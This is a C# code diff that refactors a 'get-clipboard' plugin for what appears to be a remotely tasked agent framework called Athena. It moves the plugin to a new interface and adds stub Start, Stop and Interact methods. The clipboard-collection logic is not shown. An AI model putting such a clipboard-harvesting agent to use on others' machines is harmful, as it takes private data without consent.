@@ -1,5 +1,6 @@
 ﻿using Athena.Commands;
 using Athena.Commands.Models;
+using Athena.Models.Comms.Tasks;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -9,9 +10,12 @@ using System.Threading;
 
 namespace Plugins
 {
-    public class GetClipboard : AthenaPlugin
+    public class GetClipboard : IPlugin
     {
-        public override string Name => "get-clipboard";
+        public string Name => "get-clipboard";
+
+        public bool Interactive => false;
+
         static class WindowsClipboard
         {
             static void TryOpenClipboard()
@@ -168,7 +172,7 @@ namespace Plugins
         }
 
 
-        public override void Execute(Dictionary<string, string> args)
+        public void Start(Dictionary<string, string> args)
         {
             //I can either include this all in one (easier but larger plugin size)
             //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
@@ -192,6 +196,21 @@ namespace Plugins
                 TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                 return;
             }
+        }
+
+        public void Interact(InteractiveMessage message)
+        {
+            throw new NotImplementedException();
+        }
+
+        public void Stop(string task_id)
+        {
+            throw new NotImplementedException();
+        }
+
+        public bool IsRunning()
+        {
+            throw new NotImplementedException();
         }
     }
 }
